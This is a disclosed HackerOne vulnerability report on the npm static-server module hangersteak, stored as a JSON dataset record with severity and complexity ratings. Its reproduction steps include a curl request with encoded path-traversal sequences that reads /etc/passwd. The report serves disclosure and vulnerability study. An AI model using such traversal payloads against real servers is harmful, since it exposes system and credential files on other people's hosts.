{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bp0lr ",
  "title": "[hangersteak] Web Server Directory Traversal via Crafted GET Request",
  "content": "\nI would like to report path traversal in hangersteak module.\nIt allows an attacker to read system files via path traversal local/remote\nModule\nmodule name: hangersteak\nversion: 0.2.4 (latest)\nnpm page: https://www.npmjs.com/package/hangersteak\nModule Description\nNode web static files server with built in compression support.\nModule Stats\ndownloads in the last year 1,684\nVulnerability\nVulnerability Description\nDirectory traversal through the url which doesn't verify the file is from the root directory path.\nSteps To Reproduce:\n1 npm install hangersteak\n2 create index.js with content\nCode 743 Bytes\n1const hangersteak = require('hangersteak')\n2const server = http.createServer((req, res) => { hangersteak(req, res) })\n3server.listen(3006)```\n4\n53 start the aplication `nodejs index.js`\n64 `curl \"http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"`\n7\n8it will list the content of /etc/passwd\n9\n10# Wrap up\n11\n12> Select Y or N for the following statements:\n13\n14- I contacted the maintainer to let them know: [N] \n15- I opened an issue in the related repository: [N] \n16\n17thanks!\n18\n19## Impact\n20\n21An attacker can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.\n22The package by default listen to 0.0.0.0 enabling external access.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1598817360,
  "report_url": "https://hackerone.com/reports/790873",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install hangersteak module: `npm install hangersteak`"
    ],
    [
      2,
      "Create an index.js file with the provided code snippet"
    ],
    [
      3,
      "Start the application: `nodejs index.js`"
    ],
    [
      4,
      "Execute a crafted GET request with path traversal: `curl \"http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"`"
    ]
  ],
  "vuln_description": "The hangersteak module is vulnerable to directory traversal, allowing an attacker to read arbitrary system files by crafting a GET request with encoded path traversal sequences. This occurs because the module fails to properly validate that requested files are within the intended root directory.",
  "reason": "The vulnerability is straightforward to discover as it involves a common web server misconfiguration (lack of path traversal protection) and uses standard testing techniques (URL-encoded path traversal sequences). No complex application states or novel logic is required to exploit this vulnerability.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}